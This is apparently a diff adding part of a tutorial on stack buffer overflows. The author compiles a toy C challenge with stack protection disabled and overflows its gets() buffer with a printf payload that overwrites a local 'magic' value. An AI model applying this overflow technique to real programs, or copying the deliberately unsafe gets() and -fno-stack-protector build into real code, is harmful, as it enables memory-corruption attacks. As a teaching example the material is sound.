@@ -45,4 +45,43 @@ Let us analyze the code:
 3. The `main` function simply called `say_hello` with a `magic` value that was initialized to `0`, hence we should never fulfill the condition to get us a shell.
 4. Also notice `setbuf(stdout, NULL)` - this basically replaces `fflush` on `stdout` and simply makes sure we print out immidiately without buffering. It's not super important for now.
 
+Well, let us compile using `gcc`, but with a special flag I will mention shortly: `-fno-stack-protector`. I also use `-w` to ignore all warnings.  
+Since I do not like typing a lot, I put things in a `Makefile`:
 
+```
+CC=gcc
+CFLAGS=-fno-stack-protector -w
+
+chall: chall.c
+	$(CC) $(CFLAGS) -o chall chall.c
+
+clean:
+	rm -f chall
+```
+
+Upon compilation:
+
+```shell
+gcc -fno-stack-protector -w -o chall chall.c
+/usr/bin/ld: /tmp/ccODuVW9.o: in function `say_hello':
+chall.c:(.text+0x48): warning: the `gets' function is dangerous and should not be used.
+```
+
+That's just a warning (even though I ignored the warnings with `-w`!), but a big hint on the issue.  
+After successfully compiling, let's run:
+
+```shell
+$ ./chall
+What is your name? JBO
+Hello JBO!
+```
+
+So far so good. Although, take a look at this!
+
+```shell
+$ printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFE\xCA\x37\x13" | ./chall
+What is your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��7!
+woot!
+```
+
+Looks like we satisfied the condition of `*magic == 0x1337CAFE`! How?
